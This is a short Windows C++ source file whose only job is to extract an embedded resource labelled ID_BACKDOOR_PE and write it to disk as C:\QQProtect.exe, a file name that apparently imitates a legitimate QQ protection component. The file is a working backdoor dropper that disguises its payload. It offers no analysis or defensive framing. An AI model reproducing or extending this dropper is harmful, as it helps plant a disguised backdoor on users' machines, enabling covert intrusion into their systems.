// res.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"


#include <windows.h>
#include "resource.h"
BOOL ReleaseRes()
{
	HRSRC	hRsrc;
	HANDLE	hRes,hFile;
	LPVOID	lpBase;
	DWORD	dwResSize,dwWrite;

	hRsrc = FindResource(NULL,MAKEINTRESOURCE(ID_BACKDOOR_PE),MAKEINTRESOURCE(RC_PE));

	hRes = LoadResource(NULL,hRsrc);

	lpBase = LockResource(hRes);

	dwResSize = SizeofResource(NULL,hRsrc);

	hFile = CreateFile("C:\\QQProtect.exe",GENERIC_ALL,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);

	WriteFile(hFile,lpBase,dwResSize,&dwWrite,NULL);

	CloseHandle(hFile);
	GlobalFree(hRes);
	return TRUE;
}

int main(int argc, char* argv[])
{
	ReleaseRes();
	return 0;
}
